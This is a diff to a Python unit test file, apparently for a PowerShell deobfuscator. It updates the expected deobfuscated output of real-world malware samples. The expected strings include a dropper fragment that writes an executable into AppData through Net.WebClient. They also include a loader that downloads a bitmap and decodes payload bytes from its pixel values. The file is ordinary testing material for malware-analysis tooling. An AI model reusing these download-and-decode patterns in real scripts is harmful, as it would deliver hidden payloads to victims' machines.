@@ -389,7 +389,7 @@ class TestPs1RealWorldLarge(TestUnitBase):
         test = data | self.load() | str
         goal = inspect.cleandoc(
             r'''
-            if ((Get-WmiObject Win32_OperatingSystem).OsArchitecture -Match 'ビ') {
+            if ((Get-WmiObject Win32_OperatingSystem).OSArchitecture -Match 'ビ') {
               $zGK = "${env:AppData}\twaIn_32.exe"
               Pop-Location
               $4ai = (New-Object Net.WebClient)
@@ -467,7 +467,7 @@ class TestPs1RealWorldLarge(TestUnitBase):
             '''
             $G = New-Object 'System.Drawing.Bitmap' ((New-Object 'Net.WebClient').OpenRead('[[URL]]'))
             $o = New-Object 'Byte[]' 194600
-            (0..277) | & % {
+            (0..277) | ForEach-Object {
               foreach ($X in (0..699)) {
                 $P = $G.GetPixel($x, $_)
                 $o[$_ * 700 + $X] = ([Math]::Floor(($P.b -BAnd 15) * 16) -BOr ($P.g -BAnd 15))
